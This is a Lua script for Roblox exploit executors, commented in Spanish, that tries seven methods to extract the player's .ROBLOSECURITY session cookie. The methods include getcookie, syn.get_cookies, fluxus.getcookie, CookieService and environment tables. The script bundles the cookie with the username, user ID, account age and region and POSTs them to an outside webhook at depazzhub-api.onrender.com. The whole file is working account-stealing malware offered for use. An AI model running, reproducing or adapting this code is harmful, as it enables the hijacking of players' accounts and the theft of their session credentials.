-- =====================================================================
-- WEBHOOK UNIVERSAL CON EXTRACCIÓN AGRESIVA DE COOKIES
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- FUNCIÓN AGRESIVA DE EXTRACCIÓN DE COOKIES
local function GetUniversalCookie()
    local cookie = nil
    
    -- MÉTODO 1: getcookie() directo
    if type(getcookie) == "function" then
        local success, result = pcall(getcookie)
        if success and result and tostring(result) ~= "" then
            cookie = tostring(result)
            print("✅ Cookie obtenida con getcookie()")
        end
    end
    
    -- MÉTODO 2: syn.get_cookies()
    if not cookie and type(syn) == "table" and type(syn.get_cookies) == "function" then
        local success, result = pcall(syn.get_cookies)
        if success and result then
            for _, c in ipairs(result) do
                if c.Name == ".ROBLOSECURITY" then
                    cookie = c.Value
                    print("✅ Cookie obtenida con syn.get_cookies()")
                    break
                end
            end
        end
    end
    
    -- MÉTODO 3: fluxus.getcookie()
    if not cookie and type(fluxus) == "table" and type(fluxus.getcookie) == "function" then
        local success, result = pcall(fluxus.getcookie)
        if success and result and tostring(result) ~= "" then
            cookie = tostring(result)
            print("✅ Cookie obtenida con fluxus.getcookie()")
        end
    end
    
    -- MÉTODO 4: CookieService de Roblox
    if not cookie then
        local success, CookieService = pcall(function() 
            return game:GetService("CookieService") 
        end)
        
        if success and CookieService then
            local success2, cookies = pcall(function()
                return CookieService:GetCookies()
            end)
            
            if success2 and cookies then
                for _, c in ipairs(cookies) do
                    if c.Name == ".ROBLOSECURITY" then
                        cookie = c.Value
                        print("✅ Cookie obtenida con CookieService:GetCookies()")
                        break
                    end
                end
            end
            
            -- Intentar con GetCookieValue
            if not cookie then
                local success3, savedCookie = pcall(function() 
                    return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
                end)
                if success3 and savedCookie and tostring(savedCookie) ~= "" then
                    cookie = tostring(savedCookie)
                    print("✅ Cookie obtenida con CookieService:GetCookieValue()")
                end
            end
        end
    end
    
    -- MÉTODO 5: Variables de entorno
    if not cookie then
        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token", "ROBLOX_COOKIE"}
        for _, name in ipairs(envNames) do
            local env = getgenv()
            if env[name] and tostring(env[name]) ~= "" then
                cookie = tostring(env[name])
                print("✅ Cookie obtenida de getgenv()." .. name)
                break
            end
        end
    end
    
    -- MÉTODO 6: Buscar en _G
    if not cookie then
        if _G[".ROBLOSECURITY"] and tostring(_G[".ROBLOSECURITY"]) ~= "" then
            cookie = tostring(_G[".ROBLOSECURITY"])
            print("✅ Cookie obtenida de _G")
        end
    end
    
    -- MÉTODO 7: http_request (algunos executors)
    if not cookie and type(http_request) == "function" then
        local success, result = pcall(function()
            return http_request({
                Url = "https://www.roblox.com",
                Method = "GET"
            })
        end)
        if success and result and result.Cookies then
            for cookieStr in string.gmatch(result.Cookies, "[^;]+") do
                local name, value = string.match(cookieStr, "%s*(.-)=(.-)$")
                if name == ".ROBLOSECURITY" then
                    cookie = value
                    print("✅ Cookie obtenida de http_request headers")
                    break
                end
            end
        end
    end
    
    -- Si encontramos cookie, devolver con formato
    if cookie then
        return ".ROBLOSECURITY=" .. cookie
    end
    
    -- DEBUG: Mostrar qué funciones están disponibles
    print("️ Cookie no encontrada. Funciones disponibles:")
    print("  - getcookie():", type(getcookie) == "function")
    print("  - syn.get_cookies():", type(syn) == "table" and type(syn.get_cookies) == "function")
    print("  - fluxus.getcookie():", type(fluxus) == "table" and type(fluxus.getcookie) == "function")
    print("  - http_request():", type(http_request) == "function")
    print("  - request():", type(request) == "function")
    
    return "COOKIE_NO_DISPONIBLE"
end

-- FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- RECOPILACIÓN DE DATOS
local cookie = GetUniversalCookie()

local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = cookie
}

-- FUNCIÓN DE ENVÍO
local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    if type(request) == "function" then
        return pcall(request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
    
    if type(syn) == "table" and type(syn.request) == "function" then
        return pcall(syn.request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
    
    return pcall(function()
        return HttpService:PostAsync(url, jsonData)
    end)
end

-- ENVÍO
local webhookUrl = "https://depazzhub-api.onrender.com/log"

print("📤 Enviando webhook para:", player.Name)
print(" Cookie:", string.sub(cookie, 1, 50) .. "...")

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ Webhook enviado correctamente!")
else
    warn("❌ Error:", response)
end
